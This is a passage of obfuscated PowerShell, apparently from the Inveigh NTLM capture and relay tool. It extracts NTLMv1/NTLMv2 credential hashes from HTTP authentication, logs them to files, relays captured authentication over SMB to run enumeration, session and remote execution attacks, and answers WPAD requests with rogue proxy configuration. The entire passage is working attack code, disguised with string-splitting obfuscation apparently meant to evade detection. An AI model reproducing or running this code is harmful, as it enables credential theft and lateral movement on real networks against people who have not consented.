                            ${Nt`LM} = &("{4}{3}{0}{2}{1}"-f 'al','e64','lengeBas','Ch','Get-NTLM') ${Chall`e`NGe} ${http_s`o`UR`cE_`IP} ${HTtp`_cLie`NT}."CLie`NT"."Re`mot`EE`NdPoi`NT"."Po`Rt"
                        }

                    }
                    else
                    {
                        ${nt`lm} = &("{1}{4}{2}{5}{0}{6}{3}" -f 'a','G','n','64','et-NTLMChalle','geB','se') ${C`h`Al`leNge} ${Ht`TP_`SO`U`Rce_IP} ${HTtp_`clIE`Nt}."clie`Nt"."ReMO`TeeNDpO`Int"."P`oRt"
                    }

                }
                elseif( (&("{0}{2}{1}"-f 'GeT','Le','-VAriAB') ("xV"+"8QN"+"b") ).VAlUe::"T`oST`RIng"(${http_rEq`Ue`ST_`ByT`ES}[8..11]) -eq ("{1}{2}{0}"-f '0-00','0','3-00-0'))
                {
                    ${httP_`N`TLm_`LENgtH} = &("{1}{5}{0}{2}{4}{3}" -f'D','Get-','at','Length','a','UInt16') 20 ${h`TtP_rEqueSt`_`BYTES}
                    ${H`TTp`_nTLM_`offSEt} = &("{0}{3}{2}{4}{1}"-f'Get-U','h','ataLeng','Int32D','t') 24 ${hTtP`_`ReQUe`sT_`By`TeS}
                    ${HttP_n`Tlm`_doMAIN_`L`eNgtH} = &("{0}{1}{5}{4}{3}{2}"-f'Ge','t-','ngth','ataLe','Int16D','U') 28 ${htT`P_r`EqUeS`T_BYTES}
                    ${Http_`N`Tlm_dOm`AI`N_OfFsET} = &("{2}{0}{3}{1}{4}{5}"-f'-','nt32DataLeng','Get','UI','t','h') 32 ${HT`T`P_rEquEs`T_byTES}
                    ${nt`Lm`_C`Hall`ENGe} = ${I`N`VeIgH}."HtT`P_SessIo`N_TaB`Le".${seSs`i`ON}
                       
                    if(${HTT`p_ntlm`_dOMai`N_`lEn`GTH} -eq 0)
                    {
                        ${H`Ttp_NTlM_d`OmAIn`_s`T`Ri`Ng} = ${n`Ull}
                    }
                    else
                    {  
                        ${HTTp_n`TlM`_`Do`MaIn_`StRinG} = &("{0}{2}{1}{4}{3}"-f'Convert','ToS','-Data','ring','t') ${htT`P_`N`TLM`_DOMain`_`OfFSeT} ${HTTp_NT`l`M_dO`MAin_LEN`gTH} ${HTtp`_rEq`U`ES`T`_ByTEs}
                    } 
                    
                    ${HTtp`_Ntl`m_USE`R_LENgth} = &("{3}{2}{4}{1}{0}" -f'gth','n','t','Ge','-UInt16DataLe') 36 ${h`TTp_r`equEst_`Bytes}
                    ${H`Tt`P_ntL`M_uSeR_Of`F`sET} = &("{0}{4}{1}{3}{2}"-f'G','t32Dat','gth','aLen','et-UIn') 40 ${HTtp_ReQ`U`eST`_B`y`TeS}
                    
                    if(${hTt`P`_N`Tl`m_u`sEr`_LENgtH} -eq 0)
                    {    
                        ${hTT`P_nTlm_`U`s`Er`_StRING} = ${N`ULl}
                    }
                    else
                    {
                        ${HTTP_nTl`M_u`seR`_stri`Ng} = &("{0}{1}{2}{3}{4}"-f 'Conve','rt-DataToS','tr','i','ng') ${h`TTp_nTlM_usER_oF`F`s`Et} ${ht`T`P_`NTLm_`User_LeNgth} ${H`T`TP_Re`Que`st_byteS}
                    }

                    ${HT`Tp_`USErN`AmE_`FuLl} = ${HT`Tp_NT`lm_`DomAin_StR`I`Ng} + "\" + ${HT`Tp_n`T`LM_`USeR`_S`TRinG}
                    ${Ht`Tp`_nT`LM_`hoS`T`_LengTh} = &("{3}{4}{1}{0}{2}{5}" -f '6D','t-UInt1','at','G','e','aLength') 44 ${h`TTP`_`ReQuE`st_b`yteS}
                    ${http_Ntlm_`h`O`sT`_of`FSeT} = &("{0}{4}{1}{2}{3}"-f 'Get-U','Da','taLen','gth','Int32') 48 ${htT`P_`RE`qUeSt`_`Bytes}
                    ${htTP_N`T`lM_h`OST_S`Tr`iNG} = &("{1}{2}{0}{3}" -f 'DataToSt','Co','nvert-','ring') ${h`Ttp_nt`lM`_Ho`St_`OfF`sEt} ${httP_`Nt`Lm_hOsT_L`engTh} ${H`TT`P_`ReQU`EsT`_BYtes}

                    if(${Htt`p_`N`TL`M_Len`gth} -eq 24) 
                    {
                        ${N`T`L`m_TYpE} = ("{0}{2}{1}"-f'N','LMv1','T')
                        ${nTL`M_rESPon`SE} =   ( &("{0}{1}{2}"-f'VAri','Abl','E') ('xV8'+'qnB')).VAlUE::"TosT`RiNG"(${Ht`TP_`R`eQuest_`B`yTEs}[(${h`TTp_`NTlm_OFF`SeT} - 24)..(${http_n`TlM_`O`FfsET} + ${hTTp_`Nt`LM`_leNgTh})]) -replace "-",""
                        ${ntLM`_rE`sPO`N`Se} = ${NT`l`M_REspONse}.("{0}{1}" -f 'I','nsert').Invoke(48,':')
                        ${htt`P_`N`TLM_hAsh} = ${hTT`P`_NtLM_`USER_`stRINg} + "::" + ${H`TTP_Nt`lM`_Do`mAiN_S`TR`INg} + ":" + ${n`Tlm_re`sPONsE} + ":" + ${NT`LM_`CHAl`lEN`GE}

                        if(${NtLm_`Ch`A`ll`ENGe} -and ${ntLm_rE`SP`ONSe} -and (${in`VEi`gh}."m`AcH`i`Ne_acCo`UNTs" -or (!${iN`V`eigH}."m`Ach`inE`_acc`ouNTs" -and -not ${Http_`N`Tl`M_USer_s`TRi`NG}.("{2}{1}{0}"-f'With','s','End').Invoke('$'))))
                        {     
                            ${INVE`i`gH}."nTl`mV1`_`LiSt".("{0}{1}"-f 'A','dd').Invoke(${HtT`P_`Nt`LM_H`Ash}) > ${nU`Ll}
                        
                            if(!${InvEI`GH}."c`o`NsOLE_U`NIque" -or (${inVEi`gH}."C`oNSoL`e_u`NIQUe" -and ${In`Ve`Igh}."nTLm`V1_uSe`RN`AME_l`I`sT" -notcontains ("$HTTP_source_IP "+"$HTTP_username_full")))
                            {
                                ${iN`VEi`gH}."O`UT`put`_QUeuE"."A`Dd"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`: ")) > ${N`ULL}
                                ${I`NVE`IgH}."O`UTPu`T_`QueUE".("{1}{0}"-f'dd','A').Invoke(${Ht`TP_`NtLm_`HAsH}) > ${NU`lL}
                            }
                            else
                            {
                                ${In`Veigh}."o`UTPUT`_qUE`UE"."a`dD"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique] ")) > ${n`ULl}
                            }

                            if(${I`NVEi`GH}."FILE`_OUTp`UT" -and (!${i`Nve`Igh}."F`iLe_UN`I`qUE" -or (${iNv`eI`GH}."fiL`E`_uNIquE" -and ${InVe`i`gH}."Nt`LmV1`_`U`SErnamE_LIst" -notcontains ("$HTTP_source_IP "+"$HTTP_username_full"))))
                            {
                                ${inVeI`gh}."nTl`mV1_`FiLe_`QUEuE".("{1}{0}" -f'dd','A').Invoke(${H`TTp_`Nt`LM`_haSh}) > ${N`ULL}
                                ${i`NVe`iGh}."ouTpU`T_Q`U`EUE"."A`dD"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type written to  ") + ("{1}{0}{3}{2}" -f 'gh','Invei','NTLMv1.txt','-')) > ${nu`ll}
                            }

                            if(${inV`eIGH}."ntLmv`1_U`seRn`AMe_lIst" -notcontains ("$HTTP_source_IP "+"$HTTP_username_full"))
                            {
                                ${iN`VeiGH}."nT`LMv1_`US`ErNaMe_`LisT".("{1}{0}"-f'dd','A').Invoke(("$HTTP_source_IP "+"$HTTP_username_full")) > ${n`ULL}
                            }

                        }

                    }
                    else 
                    {   
                        ${Nt`LM`_tyPe} = ("{2}{0}{1}"-f 'LMv','2','NT')           
                        ${n`T`LM_R`e`sPONse} =   ( &("{2}{1}{3}{0}" -f 'ilDiTEm','eT-','G','Ch') ("Var"+"i"+"aBle"+":x"+"V8Qnb")  ).VALue::"To`sT`RING"(${HTt`p`_Requ`EsT`_B`YTeS}[${HTtP_`NT`LM_`O`FfseT}..(${HT`Tp_nT`l`m_OFfS`et} + ${H`TTP_`N`TLm`_LenGth})]) -replace "-",""
                        ${NTLm_`RE`sPon`SE} = ${N`T`lm`_respONsE}.("{0}{1}"-f 'In','sert').Invoke(32,':')
                        ${h`TTp_N`T`Lm_HASh} = ${ht`Tp_`NTlm`_useR_str`i`NG} + "::" + ${Ht`Tp_nTLm`_`DOmAin_StR`ING} + ":" + ${nT`lM_C`HALL`EnGe} + ":" + ${nT`LM_res`PO`NSe}
                        
                        if(${n`T`lM_cHAl`LEN`ge} -and ${ntLm_r`eS`PON`se} -and (${i`NvE`iGH}."m`Ac`hi`Ne_aCC`oun`Ts" -or (!${inv`eI`GH}."ma`CHiNE`_aC`Co`UNTS" -and -not ${h`T`TP_n`TlM_UsE`R_STrINg}.("{1}{0}" -f 'sWith','End').Invoke('$'))))
                        {
                            ${i`NVeIgH}."nT`lmv2`_L`IST".("{0}{1}"-f 'A','dd').Invoke(${HTt`P`_NtL`m_hAsh}) > ${nu`LL}
                        
                            if(!${i`Nveigh}."C`o`N`solE_Uniq`Ue" -or (${I`NVEI`GH}."c`ONSOle_UNi`quE" -and ${i`Nv`EIgh}."Nt`LMv`2_useR`NA`ME_LI`ST" -notcontains ("$HTTP_source_IP "+"$HTTP_username_full")))
                            {
                                ${invE`i`Gh}."o`UTpuT`_q`UeUe"."a`DD"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`: ")) > ${N`ULL}
                                ${iNV`Ei`gh}."OUtpUT_q`UE`Ue".("{0}{1}" -f 'Ad','d').Invoke(${hT`TP_NtLM_h`A`sh}) > ${nu`LL}
                            }
                            else
                            {
                                ${InvE`Igh}."output`_q`UeuE"."A`DD"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique] ")) > ${n`ULl}
                            }

                            if(${Inv`Ei`Gh}."FiLe_OU`T`puT" -and (!${I`NV`eIgh}."F`iLe_unI`QUe" -or (${i`N`VEIGh}."F`IL`e_UnIQUe" -and ${I`Nveigh}."nTLMV2_`U`seRnAM`E_LISt" -notcontains ("$HTTP_source_IP "+"$HTTP_username_full"))))
                            {
                                ${iNVEi`GH}."Ntlmv2`_fi`LE`_`Queue".("{0}{1}" -f 'A','dd').Invoke(${HTTp_n`TlM_Ha`sh}) > ${NU`lL}
                                ${iN`Ve`igH}."oUtP`U`T_q`Ueue"."A`dD"(("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 written to  ") + ("{3}{1}{2}{0}" -f'2.txt','igh-NTL','Mv','Inve')) > ${Nu`Ll}
                            }

                            if(${i`Nv`eIgH}."nTlmV2_`UseRnAm`e_`Li`St" -notcontains ("$HTTP_source_IP "+"$HTTP_username_full"))
                            {
                                ${iNV`ei`GH}."ntLmv2_`USEr`N`AMe_`lIST".("{0}{1}" -f 'A','dd').Invoke(("$HTTP_source_IP "+"$HTTP_username_full")) > ${N`Ull}
                            }
                        
                        }

                    }
                    
                    if(${H`Tt`P_NtlM_DO`Mai`N_sTRI`NG} -and ${h`T`T`P_NtLm_`USer_stRINg} -and ${httP`_nT`Lm_`Ho`sT_`StRiNg} -and ${HTt`P_s`ourcE_`iP})
                    {
                        &("{2}{1}{0}{4}{3}" -f 'es','S','Invoke-','e','sionUpdat') ${HtTP_NTlM`_DO`mAiN`_strI`NG} ${HTT`p_N`TlM_`Use`R_STRinG} ${H`T`T`P_NTlm_hOS`T_sTrIng} ${hTtp`_so`URce_`ip}
                    }

                    ${HtTp_`RESP`Onse`_`sTatUS_CoDe} = 0x32,0x30,0x30
                    ${hTt`P`_resPoN`s`e_pHRa`se} = 0x4f,0x4b
                    ${HTTp`_cl`ie`Nt_c`LOsE} = ${TR`UE}
                    ${N`TLm`_cHaL`lENgE} = ${N`UlL}
                    
                    if(${I`NVe`iGh}."s`m`B_RElaY" -and ${RELaY`_`S`TeP} -eq 2)
                    {

                        if(!${Us`E`Rname} -or ${U`sERNa`ME} -contains ${HTT`p_N`TLm_USer`_S`TR`ing} -or ${uSE`Rname} -contains ${H`TT`P_`UsE`RNamE_`FUlL})
                        {

                            if(${INV`E`igh}."M`Ac`hiNE_A`CcO`U`NtS" -or (!${INvE`iGH}."m`AchI`NE_AcCo`U`Nts" -and -not ${httP`_Nt`L`M_`U`Ser_S`TriNg}.("{0}{1}" -f'EndsWi','th').Invoke('$')))
                            {

                                if(${In`Veigh}."R`Elay`_`FaILEd_Login`_T`A`B`LE".${h`TTP_Use`Rna`mE`_F`ULL}."Co`Unt" -le ${FAiLED`l`OGiNTHRe`s`holD})
                                {

                                    ${in`VE`IGh}."out`P`UT_`QUEuE"."A`Dd"(("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target ")) > ${N`Ull}
                                    ${SMB_rE`La`Y_F`AIl`eD} = &("{3}{1}{2}{0}{4}" -f'p','BRel','ayRes','Invoke-SM','onse') ${sm`B_CLI`ENT} ${HT`TP_`RE`quE`st_By`TEs} ${sMB`_V`E`RSIOn} ${s`mB_US`er`_Id} ${SE`ssion`_ID} ${p`RoCess`_ID_b`Y`T`Es}
                                    
                                    if(!${SMb_`RelAy_F`A`ILEd})
                                    {
                                        ${i`NveI`GH}."SESsION`_c`U`RrENT" = ${iN`VeIGH}."SessIOn`_c`oUnt"
                                        ${i`Nve`IgH}."sESs`Ion_`m`e`SsAGe_id_ta`B`LE".("{1}{0}"-f'd','Ad').Invoke(${I`NV`eigH}."s`eSS`ion_`C`ouNT",3)

                                        if(${A`T`TAck} -contains ("{0}{1}" -f 'Ses','sion'))
                                        {
                                            
                                            if(${smb_CL`I`ENt}."cOnNE`c`TeD")
                                            {
                                                ${inV`e`igh}."seSs`Ion_SOcKe`T`_tAble"[${inV`E`IgH}."s`E`SSIon_CoUNt"] = ${SM`B_c`lIENt}
                                                ${iNVEI`GH}."sEssI`O`N_ta`BlE"[${In`Ve`Igh}."SeS`si`oN_c`o`Unt"] = ${sES`sI`On_`iD}
                                                ${i`Nvei`gh}."ses`SIOn`_LOc`k_tabLe"[${InV`EI`gh}."SE`SSio`N_CO`UNt"] = ("{0}{1}"-f'op','en')
                                                ${sESS`ioN_`PrIvI`LEge} = &("{0}{4}{5}{3}{2}{6}{1}" -f'In','e','SMBR','-','vok','e','elayExecut') ${smB`_`CLiE`Nt} ${smb_ve`Rsi`On} ${sm`B_us`ER_`id} ${s`E`SSI`on_Id} ${proc`EsS_id_`BY`TeS} ${tR`Ue}
                                                ${sESsIOn`_OBj`EcT} = &("{0}{1}{2}" -f 'New','-Objec','t') ("{1}{0}{2}" -f'Obj','PS','ect')
                                                &("{2}{0}{1}" -f 'Memb','er','Add-') -InputObject ${S`Essi`oN_`oBJ`ecT} -MemberType ("{0}{2}{1}" -f'N','Property','ote') -Name ("{1}{0}" -f'sion','Ses') ${IN`V`EIGh}."s`e`SSIon_counT"
                                                &("{2}{0}{1}"-f 'dd-Memb','er','A') -InputObject ${Se`Ss`I`oN_O`BJeCt} -MemberType ("{1}{2}{0}" -f'y','Note','Propert') -Name ("{0}{2}{1}"-f'Ta','et','rg') ${S`Mb_`c`LiEnt}."c`liENt"."rE`mo`T`eENdPoiNT"."AddR`esS"."IPAdD`REsS`ToSt`RING"
                                                &("{2}{0}{1}" -f 'dd-','Member','A') -InputObject ${sEss`iOn_ObJ`e`cT} -MemberType ("{2}{0}{1}{3}" -f 'ro','pe','NoteP','rty') -Name ("{0}{1}{2}"-f 'In','i','tiator') ${h`T`TP_soURC`E_iP}
                                                &("{1}{2}{0}{3}" -f'-M','A','dd','ember') -InputObject ${seSS`i`ON`_O`BjeCT} -MemberType ("{3}{1}{0}{2}" -f 'o','r','perty','NoteP') -Name ("{1}{0}"-f'r','Use') ${H`TTP_u`sERn`AME`_Fu`lL}
                                                
                                                if(${S`ESS`iOn_`pRI`VI`LEGE})
                                                {
                                                    &("{2}{0}{1}"-f 'emb','er','Add-M') -InputObject ${Se`S`S`iON_Obje`ct} -MemberType ("{2}{1}{0}"-f 'ty','oper','NotePr') -Name ("{1}{0}{2}"-f'ivilege','Pr','d') "yes"
                                                }
                                                else
                                                {
                                                    &("{1}{0}{3}{2}" -f'dd-M','A','ber','em') -InputObject ${SES`s`IO`N`_oBJEcT} -MemberType ("{0}{2}{1}{3}"-f'Note','o','Pr','perty') -Name ("{2}{1}{0}{3}"-f 'le','rivi','P','ged') "no"
                                                }

                                                if(${S`mb_CL`IEnT}."COn`NEc`TED")
                                                {
                                                    ${stAt`US} = ("{2}{1}{0}" -f'cted','nne','co')
                                                    &("{1}{2}{0}"-f 'ber','Add','-Mem') -InputObject ${se`S`SiOn_`OBjECt} -MemberType ("{1}{2}{0}{3}" -f 'opert','No','tePr','y') -Name ("{0}{1}"-f'Statu','s') ${s`Ta`Tus}
                                                    &("{3}{1}{0}{2}" -f'-Me','d','mber','Ad') -InputObject ${SeSsiO`N_OB`J`E`ct} -MemberType ("{3}{2}{1}{0}" -f'y','pert','ro','NoteP') -Name ("{2}{0}{3}{1}" -f 'tab','hed','Es','lis') $(&("{1}{0}{2}"-f't-D','Ge','ate') -format ('s'))
                                                    &("{3}{0}{2}{1}" -f'-','mber','Me','Add') -InputObject ${SeS`sIoN`_O`BJE`ct} -MemberType ("{1}{3}{0}{2}" -f 'ropert','No','y','teP') -Name ("{0}{1}{2}" -f'Las','t A','ctivity') $(&("{2}{0}{1}" -f'at','e','Get-D') -format ('s'))
                                                    ${InV`Ei`gH}."SeS`sI`ON" += ${SE`Ss`Io`N_oBje`cT}
                                                    ${Inve`I`Gh}."oUtPuT`_`q`UEUe"."A`dd"(("[!] [$(Get-Date -format s)] Session $($inveigh.session_count) added to session list ")) > ${nu`ll}
                                                }

                                            }

                                        }

                                        if(${a`TtACK} -contains ("{0}{1}{2}"-f'Enu','m','erate') -or ${A`Tta`ck} -contains ("{0}{1}"-f'Ex','ecute'))
                                        {

                                            for(${I} = 0;${I} -lt ${I`N`VeIgh}."E`NUMeRa`Te"."cOU`NT";${I}++)
                                            {

                                                if(${INVei`gH}."E`NumeRa`TE"[${i}]."I`P" -eq ${TarG`ET})
                                                {
                                                    ${TargeT`_`I`Ndex} = ${i}
                                                    break
                                                }

                                            }

                                            ${fIL`Ter_`Da`Te} = &("{0}{1}" -f'Ge','t-Date')
                                        }

                                        if((${AT`TACK} -contains ("{1}{2}{0}" -f'rate','Enu','me') -and ${SMb_cL`iE`NT}."CoN`NE`cted") -and
                                        (!${INv`EiGh}."Enu`ME`Ra`TE"[${T`AR`Get_`IND`EX}]."e`Nu`MERAte" -or
                                        (&("{1}{2}{0}{3}" -f 'pa','New-Time','S','n') ${inVE`i`GH}."EN`UMe`R`ATE"[${T`ArGeT_i`N`dex}]."EN`UMera`TE" ${FILtER_`dA`Te})."Mi`NutES" -gt ${REpeATe`NumER`A`Te}))
                                        {
                                            &("{0}{2}{4}{1}{3}" -f'Invoke-SMBR','nu','ela','m','yE') ${Smb_C`l`Ie`Nt} ${smB_useR`_`iD} ${SeS`SiOn`_ID} ${PrOcESs_`ID`_bYt`Es} ${e`N`U`meRAtE} ${enUmE`RAtEg`Ro`Up}
                                        }

                                        if(((${SesS`io`N_`PrivIleGe} -and ${A`TTaCk} -contains ("{2}{1}{0}"-f'te','ecu','Ex') -and ${a`T`TAcK} -contains ("{2}{0}{1}"-f'i','on','Sess') -and ${smB_`ClI`enT}."C`onnec`TeD") -or
                                        (${A`TtA`Ck} -contains ("{1}{0}" -f'ute','Exec') -and ${A`TtAcK} -notcontains ("{0}{1}" -f'Sess','ion') -and ${S`m`B_`CliENt}."coN`NeC`TEd")) -and
                                        (!${I`NVe`igH}."E`N`UmErAtE"[${Ta`RGEt_IN`DEX}]."ExeCu`TE" -or (&("{0}{1}{2}{3}"-f'New-','Time','Sp','an') ${InvE`igh}."E`N`UmERATE"[${t`ARGet_I`Nd`EX}]."eXe`CU`TE" ${fil`TER_`daTe})."m`InUt`ES" -gt ${Re`pEAt`EXec`UTE}))
                                        {
                                            &("{0}{3}{4}{2}{5}{1}{6}" -f 'Invok','ec','ayE','e','-SMBRel','x','ute') ${S`mB_cLI`e`Nt} ${SMb`_VErsi`oN} ${SMB_us`er_`iD} ${SEssio`N`_id} ${PrOc`eSS_i`D`_B`Y`Tes} ${f`Al`se}
                                            ${i`NvE`IGH}."En`Um`E`RATE"[${tARG`Et_`in`deX}]."ExEC`U`TE" = $(&("{2}{1}{0}"-f 'te','Da','Get-') -format ('s'))
                                        }

                                        if(!${sMB_Cl`Ie`NT}."COnnect`Ed")
                                        {
                                            ${iN`VeI`gH}."sEs`sIon"[${IN`V`eiGh}."S`ESSI`On_CounT"] | &("{3}{1}{2}{0}" -f'ct','O','bje','Where-') {${_}."s`TAT`Us" = ("{2}{1}{0}"-f'nected','scon','di')}
                                        }

                                        ${Inve`I`GH}."s`ESSIO`N_co`UNt"++
                                    }

                                    if(${A`TtA`ck} -notcontains ("{0}{1}"-f'Sess','ion') -and !${SMb`_rE`lAy_FaIl`Ed} -and ${R`ElA`YAuTo`diSabLe} -eq 'Y')
                                    {

                                        if(${AT`Ta`ck} -contains ("{2}{0}{1}"-f 'r','ate','Enume'))
                                        {

                                            for(${I} = 0;${i} -lt ${in`VeiGH}."E`NU`meratE"."COU`NT";${i}++)
                                            {

                                                if(${i`NVeI`GH}."enUMe`RAtE"[${i}]."eN`U`MERAtE")
                                                {
                                                    ${T`A`RgeTs_eNuMERaTe_`comP`LetE} = @(${I`NvEiGh}."eNU`M`eRatE"[${I}]."ip")
                                                }

                                            }

                                            if(${I`Nve`IGH}."targe`T_l`I`st" -and ${TaRGe`T`s_`eNUm`eR`ATeD})
                                            {
                                                ${tAR`gETS_enuM`er`A`T`e_rema`I`N`inG} = &("{1}{0}{3}{2}"-f'e-','Compar','ect','Obj') -ReferenceObject ${IN`V`eigh}."TA`RG`et`_list" -DifferenceObject ${T`A`R`Ge`TS_enuM`Erate_c`oMpLe`Te} -PassThru | &("{3}{1}{0}{2}" -f 'bjec','re-O','t','Whe') {${_}."s`ideI`NdiCAt`OR" -eq "<="}
                                            }

                                        }

                                        if(${AT`Ta`CK} -contains ("{2}{1}{0}"-f'ute','ec','Ex'))
                                        {

                                            for(${I} = 0;${i} -lt ${invEi`Gh}."EnuM`ERA`Te"."CO`Unt";${I}++)
                                            {

                                                if(${InV`e`IGh}."enume`RATe"[${i}]."exECU`Te")
                                                {
                                                    ${TA`RGets_`E`xE`cUtE_COmPLEtE} = @(${I`NVei`GH}."EXecu`Te"[${i}]."iP")
                                                }

                                            }

                                            if(${i`NveI`gh}."Targe`T_lI`st" -and ${TAr`g`Ets_e`NUMerAt`eD})
                                            {
                                                ${T`Ar`gET`s_eXEcUte_R`EM`A`iNiNg} = &("{1}{3}{0}{2}" -f 'Objec','C','t','ompare-') -ReferenceObject ${i`NVeIGH}."TA`RGET_`L`ISt" -DifferenceObject ${TarGETs_EXEcU`Te_`cOmPL`e`Te} -PassThru | &("{1}{3}{0}{2}" -f'j','W','ect','here-Ob') {${_}."Sid`eInd`iCatoR" -eq "<="}
                                            }

                                        }

                                        if(${aTta`ck} -notcontains ("{1}{2}{0}"-f'sion','Se','s') -or (!${T`ARGE`T`S_ENUM`erAte`_ReM`Ai`NinG} -and ${aT`TA`CK} -contains ("{2}{0}{1}"-f 'merat','e','Enu') -and ${aT`TACk} -notcontains ("{2}{0}{1}" -f 't','e','Execu')) -or
                                        (!${TaR`GEtS`_E`x`ecUTe_Rema`inIng} -and ${ATT`A`ck} -contains ("{2}{1}{0}"-f'cute','xe','E') -and ${a`TTa`Ck} -notcontains ("{2}{0}{1}" -f'e','rate','Enum')) -or
                                        (!${ta`RgE`TS_ENUm`ERa`Te_`Re`MAiNINg} -and !${taRGeTs_E`XecUt`E_rem`A`IniNG} -and ${AtTa`Ck} -contains ("{0}{2}{1}" -f 'E','ate','numer') -and ${AT`Ta`CK} -contains ("{1}{2}{0}"-f 'e','Execu','t')))
                                        {
                                            ${iN`VEIGH}."ouT`Put_`qUe`UE"."A`Dd"(("[!] [$(Get-Date -format s)] Relay auto disabled due to success ")) > ${N`UlL}
                                            ${iNVe`igh}."S`MB`_rElAy" = ${f`AL`se}
                                        }

                                    }

                                    ${r`EL`AY`_sTep} = 0

                                }
                                else
                                {
                                    ${I`NVE`Igh}."ouTpUT`_`qU`eUe"."A`DD"(("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_username_full has exceeded failed login limit ")) > ${N`ULL}
                                    ${s`mB_cLiE`Nt}.("{0}{1}"-f'C','lose').Invoke()
                                    ${r`ElaY`_StEP} = 0
                                }

                            }
                            else
                            {
                                ${inve`igh}."oUt`pUt_QuE`Ue"."a`dD"(("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_NTLM_user_string appears to be a machine account ")) > ${NU`ll}
                                ${sMb`_C`LIe`NT}.("{0}{1}" -f'Clos','e').Invoke()
                                ${rE`LaY`_STep} = 0
                            }

                        }
                        else
                        {
                            ${I`N`VEigH}."o`UTpU`T`_queUE"."A`dd"(("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list ")) > ${Nu`lL}
                            ${S`mB_cLi`Ent}.("{1}{0}" -f 'e','Clos').Invoke()
                            ${r`EL`Ay_st`eP} = 0
                        }

                    }

                    if(${PROX`y`_lI`STeNEr})
                    {
                        ${HT`T`p_SeNd} = ${f`ALSE}
                    }

                }
        
            }

            if(!${PrOX`Y_`l`IstEN`Er} -and ${wpaD`RESP`On`sE} -and ${h`Tt`p_REque`sT`_RAw_`U`Rl} -match ("{1}{2}{0}"-f't','/wpad','.da') -and (!${P`RoxYIG`N`oRE} -or !(${ProXyi`Gn`Ore} | &("{1}{0}{3}{2}"-f 'ere-Obj','Wh','t','ec') {${HTTP_HeadER_`UsER_`A`GEnT} -match ${_}})))
            {
                ${HtTP_m`eSS`Age} = ${W`p`A`DReSPoNse}
                ${hTTP`_H`eADER_C`o`NTENT_T`yPe} =  (  &("{1}{0}"-f 'ariablE','V')  IxGD).VALUE::"UT`F8".("{1}{0}{2}" -f'tByte','Ge','s').Invoke(("{4}{5}{2}{7}{3}{1}{0}{6}{8}"-f'ns-proxy-','/x-',': ','plication','Cont','ent-Type','autoconf','ap','ig'))
            }

            ${HtTp`_`T`I`mestaMp} = &("{1}{2}{0}"-f'-Date','G','et') -format ('r')
            ${HTt`P_tIMES`TA`mP} =  (  &("{2}{0}{1}"-f 'l','E','variAB') ixGd  -vALUeOn )::"U`TF8".("{2}{0}{1}" -f 'tByt','es','Ge').Invoke(${hT`TP_`TiMEst`AMP})
            ${H`T`TP_Me`ssA`Ge_BYtES} =   (&("{0}{1}" -f 'VARIaBl','E')  ('I'+'xgD')  ).vaLUE::"ut`F8".("{1}{0}{2}" -f 'yt','GetB','es').Invoke(${H`TtP_mesS`A`ge})

            if(${H`TTp`_`REque`sT`_R`AW_uRL} -notmatch ("{0}{2}{1}" -f '/wpad.','at','d') -or (${wpad`A`UTh} -like ("{0}{1}" -f 'NTL','M*') -and ${Ht`Tp_reQUeSt`_RaW`_`URL} -match ("{0}{2}{1}" -f '/wp','at','ad.d')) -and !${hTtp_Clien`T_`c`lo`se})
            { 
                ${htTp`_hE`AdeR_`A`UT`HentICATE_D`Ata} =   $iXgD::"UT`F8".("{0}{1}{2}" -f'GetBy','t','es').Invoke(${n`TLM})
            }
            
            ${pa`ck`et_Httpr`esP`O`NSe} = &("{2}{0}{1}" -f'-O','bject','New') ("{5}{7}{12}{0}{10}{4}{1}{3}{6}{2}{8}{9}{13}{11}" -f'pe','zed','ed','.O','i','System.Colle','rder','cti','Dicti','o','cial','y','ons.S','nar')
            ${p`Ac`kET_HtTP`RESpo`NSE}.("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{4}{2}{1}" -f 'H','Version','onse','TTP','Response_Resp'),[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            ${Pac`k`eT_HttPReSP`on`Se}.("{0}{1}" -f'A','dd').Invoke(("{0}{3}{1}{4}{2}" -f'HT','spons','de','TPRe','e_StatusCo'),${htT`p_RESpoNSE`_STAT`U`S_co`de} + [Byte[]](0x20))
            ${pA`CK`et_`H`TtPReSpo`Nse}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{4}{3}{6}{8}{5}{1}{7}" -f'HTTPRe','eP','s','e','pons','ons','_R','hrase','esp'),${h`TTP_reSPo`NS`e_p`hraSE} + [Byte[]](0x0d,0x0a))

            if(${hTTP_cON`Nec`TiON_H`ea`d`E`R_CLOse})
            {
                ${H`TTp`_`CoNN`ection_heA`D`ER} =  (  &("{0}{1}" -f'iT','eM') ("VARIA"+"BlE"+":I"+"xgd")).vAlUe::"u`Tf8".("{0}{2}{1}"-f 'G','s','etByte').Invoke(("{1}{3}{0}{2}" -f 'ion: ','Connec','close','t'))
                ${pa`cKet`_`Ht`TPRESpOn`SE}.("{0}{1}"-f'A','dd').Invoke(("{6}{3}{2}{4}{0}{1}{5}"-f 'Conne','ctio','Respo','TTP','nse_','n','H'),${http_Co`NnE`Ct`io`N_HE`AD`ER} + [Byte[]](0x0d,0x0a))
            }

